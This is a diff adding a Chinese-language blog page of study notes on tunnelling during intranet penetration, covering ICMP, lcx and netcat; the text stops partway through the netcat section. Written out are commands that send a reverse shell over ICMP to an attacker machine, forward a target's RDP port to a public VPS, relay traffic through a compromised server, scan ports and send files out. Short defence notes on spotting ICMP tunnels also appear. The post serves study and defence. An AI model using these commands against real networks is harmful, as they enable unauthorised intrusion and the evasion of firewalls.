@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-hacker.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-hacker.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-hacker.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":false,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言复习+学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透之隧道通信">
+<meta property="og:url" content="http://example.com/2023/08/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/index.html">
+<meta property="og:site_name" content="Scammer">
+<meta property="og:description" content="前言复习+学习。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/simg/tunnel_1.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_2.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_3.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_4.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_5.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_6.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_7.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_8.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_9.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_10.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_11.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_12.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_12.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_14.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_15.png">
+<meta property="og:image" content="http://example.com/simg/tunnel_16.png">
+<meta property="article:published_time" content="2023-08-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-30T08:11:50.235Z">
+<meta property="article:author" content="Bron">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/simg/tunnel_1.png">
+
+<link rel="canonical" href="http://example.com/2023/08/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  <title>内网渗透之隧道通信 | Scammer</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Scammer" type="application/atom+xml">
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#000000;--blockquote-color:#bbb;--link-color:#000000;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#ccc;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#161616;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#8a2be2;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Scammer</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">55</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">63</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">170</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Elaina.png">
+      <meta itemprop="name" content="Bron">
+      <meta itemprop="description" content="原谅我这一生不羁放纵爱自由">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Scammer">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网渗透之隧道通信
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-29 00:00:00" itemprop="dateCreated datePublished" datetime="2023-08-29T00:00:00+08:00">2023-08-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-30 16:11:50" itemprop="dateModified" datetime="2023-08-30T16:11:50+08:00">2023-08-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/" itemprop="url" rel="index"><span itemprop="name">隧道通信</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>19k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>17 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习+学习。</p>
+<span id="more"></span>
+<h1 id="隐藏通信隧道基础知识"><a href="#隐藏通信隧道基础知识" class="headerlink" title="隐藏通信隧道基础知识"></a>隐藏通信隧道基础知识</h1><h2 id="隐藏通信隧道概述"><a href="#隐藏通信隧道概述" class="headerlink" title="隐藏通信隧道概述"></a>隐藏通信隧道概述</h2><p>一般的网络通信，先在两台机器之间建立TCP连接，然后进行正常的数据通信。在知道IP地址的情况下，可以直接发送报文；如果不知道IP地址，就需要将域名解析成IP地址。在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接的情况，如果发现异常，就会对通信进行阻断。</p>
+<p>这里的隧道，是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</p>
+<p>常用隧道列举如下：</p>
+<ul>
+<li>网络层：ipv6隧道、ICMP隧道、GRE隧道</li>
+<li>传输层：TCP隧道、UDP隧道、常规端口转发</li>
+<li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li>
+</ul>
+<h2 id="判断内网的连通性"><a href="#判断内网的连通性" class="headerlink" title="判断内网的连通性"></a>判断内网的连通性</h2><p>判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议(TCP、HTTP、DNS、ICMP等)及端口通信的情况。常见的允许流量流出的端口有80、8080、 443、53、110、123等。常用的内网连通性判断方法如下：</p>
+<h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">命令如下：</span><br><span class="line">ping &lt;IP地址和域名&gt;</span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"></span><br><span class="line">Pinging www.xxx.com [198.18.0.106] with 32 bytes of data:</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line"></span><br><span class="line">Ping statistics for 198.18.0.106:</span><br><span class="line">    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),</span><br><span class="line">Approximate round trip times in milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br></pre></td></tr></table></figure>
+
+<h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><p>netcat （简称nc）被誉为网络安全界的“瑞士军刀”，是一个短小精悍的工具，通过使用TCP或UDP协议的网络连接读写数据。<br>使用nc工具，执行命令：<br><code>nc &lt;IP port&gt;</code><br>开启phpstudy前后：<br><img src="/simg/tunnel_1.png" alt=" "></p>
+<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p>curl是一个利用URL规则在命令行下工作的综合文件传输工具，支持文件的上传和下载。curl命令不仅支持HTTP、HTTPS、FTP等众多协议，还支持POST、Cookie、 认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。Linux 操作系统自带curl命令。在Windows操作系统中，需要下载并安装curl 命令。</p>
+<p><code>curl &lt;ip:port&gt;</code></p>
+<p>如果远程主机开启了相应的端口，会输出相应的端口信息。如果远程主机没有开通相应的端口，则没有任何提示。按“Ctrl+C”键即可断开连接。</p>
+<h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>在进行DNS连通性检测时，常用的命令为nslookup和dig。</p>
+<p>nslookup是Windows操作系统自带的DNS探测命令，其用法如下所示。在没有指定vps-ip时，nslookup会从系统网络的TCP&#x2F;IP属性中读取DNS服务器的地址。</p>
+<p><code>nslookup www.xxx.com vps-ip</code></p>
+<p>dig是Linux 默认自带的DNS探测命令，其用法如下所示。<br>在没有指定vps-ip时，dig 会到 <code>/etc/resolv.conf</code> 文件中读取系统配置的DNS服务器的地址。如果vps-ip 为192.168.43.1, 将解析xxx的IP地址，说明目前DNS协议是连通的。<br><code>dig @vps-ip www.xxx.com</code></p>
+<p>还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下：</p>
+<ul>
+<li>查看网络连接，判断是否存在与其他机器的8080 (不绝对)等端口的连接(可以尝试运行 <code>ping -n 1 -a ip</code> 命令)。</li>
+<li>查看内网中是否有主机名类似于“proxy” 的机器。</li>
+<li>查看IE浏览器的直接代理。</li>
+<li>根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看。</li>
+<li>执行如下命令，利用curl工具进行确认。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.xxx.com  //不通</span><br><span class="line">curl -X proxy-ip:port www.xxx.com  //不通</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h1><h2 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h2><h3 id="ipv6隧道技术简介"><a href="#ipv6隧道技术简介" class="headerlink" title="ipv6隧道技术简介"></a>ipv6隧道技术简介</h3><p>IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术。为了在IPv4中传递IPv6信息，可以将IPv4作为隧道载体，将IPv6报文整体封装在IPv4数据报文中，使IPv6报文能够穿过IPv4，到达另一个IPv6程序。</p>
+<p>因为现阶段的边界设备、防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。</p>
+<p><img src="/simg/tunnel_2.png" alt=" "></p>
+<p>有一点需要指出：即使设备支持IPv6，也可能无法正确分析封装了IPv6 报文的IPv4数据包。配置隧道和自动隧道的主要区别是：只有在执行隧道功能的节点的IPv6地址是IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点分配IP地址时，如果采用的是自动隧道方法，就不需要进行配置。</p>
+<p>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如采用DHCP、人工配置或他IPv4的配置机制。</p>
+<p>支持IPv6的隧道工具有socat、6tunnel 、nt6tunnel 等。</p>
+<h3 id="防御IPv6隧道攻击的方法"><a href="#防御IPv6隧道攻击的方法" class="headerlink" title="防御IPv6隧道攻击的方法"></a>防御IPv6隧道攻击的方法</h3><p>针对IPv6隧道攻击，最好的防御方法是：了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信，提高主机和应用程序的安全性。</p>
+<h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP隧道简单、实用，是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为ping命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个ping命令都有相对应的回复与请求。</p>
+<p>在一些网络环境中，如果攻击者使用各类上层隧道(例如HTTP隧道、DNS隧道、常规正&#x2F;反向端口转发等)进行的操作都失败了，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP&#x2F;UDP数据封装到ICMP的ping数据包中，从而穿过防火墙(通常防火墙不会屏蔽ping数据包)，实现不受限制的网络访问。</p>
+<p>常用的ICMP隧道工具有icmpsh、PingTunnel 、icmptunnel、 powershell icmp等。</p>
+<h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh工具使用简单，便于“携带”(跨平台),运行时不需要管理员权限。使用git clone命令下载icmpsh。<br><code>git clone https://github.com/inquisb/icmpsh.git</code></p>
+<p>安装Python的impacket类库，以便对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。<br><code>pip install impacket</code></p>
+<p>因为icmpsh工具要代替系统本身的ping命令的应答程序，输入如下命令来关闭本地系统的ICMP应答( 如果要恢复系统应答，则设置为0)，否则Shell的运行会不稳定(表现为一直刷屏，无法进行交互输入)。<br><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></p>
+<p>直接输入“.&#x2F;run.sh” 会抱错，输入如下命令运行工具：<br><code>python2 icmpsh_m.py 【kali主机地址】 【windows主机地址】 # 运行工具</code></p>
+<p>查看kali攻击者IP地址(192.168.220.165)。然后输入如下命令。<br><code>icmpsh.exe -t 【kali主机地址】</code></p>
+<p>在目标主机上运行以上命令后，即可在VPS中看到反弹的shell</p>
+<h3 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="PingTunnel"></a>PingTunnel</h3><p>PingTunnel也是一款常用的ICMP隧道工具，可以跨平台使用。为了避免隧道被滥用，可以为隧道设置密码。</p>
+<p>实验环境：</p>
+<ul>
+<li>kali攻击机：192.168.220.165</li>
+<li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li>
+<li>内网主机(windows7)：192.168.52.133</li>
+</ul>
+<p>首先，在需要建立ICMP隧道的两台机器(kali和Web服务器)上安装PingTunnel工具。 然后，输入如下命令，解压压缩文件，进行配置和编译。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line"><span class="built_in">cd</span> PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+
+<p>但在安装前需要安装它的运行环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装libpcap的依赖环境</span></span><br><span class="line">apt-get install byacc</span><br><span class="line">apt-get install flex bison</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装libpcap依赖库</span></span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+
+<p>使用方法：<br>在Web服务器192.168.220.145中输入如下命令，运行PingTunnel 工具,开启隧道。<br><code>ptunnel -x password</code></p>
+<p>在kali机器192.168.220.165中执行如下命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 192.168.220.145 -lp 2333 -da 192.168.52.133 -dp 80 -x password</span><br><span class="line"></span><br><span class="line">-p   <span class="comment"># 指定ICMP隧道另一端的IP</span></span><br><span class="line">-lp  <span class="comment"># 指定本地监听的TCP端口</span></span><br><span class="line">-da  <span class="comment"># 指定要转发的目标机器的IP</span></span><br><span class="line">-dp  <span class="comment"># 指定要转发的目标机器的TCP端口</span></span><br><span class="line">-x   <span class="comment"># 指定连接密码</span></span><br></pre></td></tr></table></figure>
+<p>上述命令的含义是：<br>在访问攻击者kali(192.168.220.165)的2333端口时，会把数据库服务器192.168.52.133的80端口的数据封装在ICMP隧道里，以Web服务器192.168.220.145为ICMP隧道跳板进行传送。</p>
+<p><img src="/simg/tunnel_3.png" alt=" "></p>
+<p>可以看到服务标识是windows7<br>如果内网机器是linux的可以连接22端口，如果是windows可以尝试3389端口</p>
+<p><code>ptunnel -p 192.168.200.34 -lp 2333 -da 192.168.100.7 -dp 22 -x password</code></p>
+<h3 id="防御ICMP隧道攻击的方法"><a href="#防御ICMP隧道攻击的方法" class="headerlink" title="防御ICMP隧道攻击的方法"></a>防御ICMP隧道攻击的方法</h3><p>许多网络管理员会阻止ICMP通信进入站点。但是在出站方向，ICMP通信是被允许的，而且目前大多数的网络和边界设备不会过滤ICMP流量。使用ICMP隧道时会产生大量的ICMP数据包，我们可以通过Wireshark进行ICMP数据包分析，以检测恶意ICMP流量，具体方法如下。</p>
+<ul>
+<li>检测同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包。</li>
+<li>注意那些Payload大于64bit的ICMP数据包。</li>
+<li>寻找响应数据包中的Payload与请求数据包中的Payload不一致的ICMP数据包。</li>
+<li>检查ICMP数据包的协议标签。例如，icmptunnel 会在所有的ICMP Payload 前面添加“TUNL”标记来标识隧道一这就是特征。</li>
+</ul>
+<h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等。</p>
+<h2 id="LCX端口转发"><a href="#LCX端口转发" class="headerlink" title="LCX端口转发"></a>LCX端口转发</h2><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows和Linux两个版本。Windows版为lcx.exe, Linux版为portmap。一个正常的Socket隧道必须具备两端：一端为服务端，监听一个端口，等待客户端的连接；另一端为客户端；通过传入服务端的IP地址和端口，才能主动与服务器连接。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Brucetg/Pentest-tools/tree/master/">下载地址</a></p>
+<h3 id="内网端口转发"><a href="#内网端口转发" class="headerlink" title="内网端口转发"></a>内网端口转发</h3><p>在目标机器上执行如下命令，将目标机器3389端口的所有数据转发到公网VPS的4444端口上。<br><code>lcx.exe -slave &lt;公网主机IP地址&gt; 4444 127.0.0.1 3389</code></p>
+<p>在VPS上执行如下命令，将本机4444端口上监听的所有数据转发到本机的5555 端口上。<br><code>lcx.exe -listen 4444 5555</code></p>
+<p>此时，用mstsc登录“&lt;公网主机IP地址&gt;:5555”，或者在VPS上用mstsc登录主机127.0.0.1的5555端口，即可访问目标服务器的3389端口。</p>
+<h3 id="本地端口映射"><a href="#本地端口映射" class="headerlink" title="本地端口映射"></a>本地端口映射</h3><p>如果目标服务器由于防火墙的限制，部分端口(例如3389)的数据无法通过防火墙，可以将目标服务器相应端口的数据透传到防火墙允许的其他端口(例如53)。在目标主机上执行如下命令，就可以直接从远程桌面连接目标主机的53端口。<br><code>lcx -tran 53 &lt;目标主机IP地址&gt; 3389</code></p>
+<h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><h3 id="简易使用"><a href="#简易使用" class="headerlink" title="简易使用"></a>简易使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-d：后台模式</span><br><span class="line">-e：程序重定向</span><br><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多可设置8个</span><br><span class="line">-G&lt;指向器数目&gt;：设置源路由指向器的数量，值为4的倍数</span><br><span class="line">-h：在线帮助</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口</span><br><span class="line">-l：使用监听模式，管理和控制传入的数据</span><br><span class="line">-n：直接使用IP地址(不通过域名服务器)</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据转换为十六进制字节码后保存在该文件中</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口</span><br><span class="line">-r：随机指定本地与远程主机的通信端口</span><br><span class="line">-s&lt;源地址&gt;：设置本地主机送出数据包的IP地址</span><br><span class="line">-u：使用UDP传输协议</span><br><span class="line">-v：详细输出</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间</span><br><span class="line">-z：将输入/输出功能关闭，只在扫描通信端口时使用</span><br></pre></td></tr></table></figure>
+
+<p>Banner抓取：<br><code>nc -nv 192.168.220.165 21</code></p>
+<p>连接远程主机<br><code>nc -nvv 192.168.220.165 80</code></p>
+<p>端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.220.165 80   扫描指定端口</span><br><span class="line">nc -v -z 192.168.220.165 20-1024   扫描端口段（速度慢）</span><br></pre></td></tr></table></figure>
+
+<p>端口监听<br><code>nc -l -p 4444   当访问该端口时会输出该信息到命令行</code></p>
+<p>文件传输</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444                               接收方开启监听</span><br><span class="line">nc -vn 192.168.220.165 4444 &lt; test.txt -q 1 发送方传输test.txt</span><br></pre></td></tr></table></figure>
+
+<p>简易聊天</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444               接收方开启监听</span><br><span class="line">nc -vn 192.168.220.165 4444 发送方</span><br></pre></td></tr></table></figure>
+
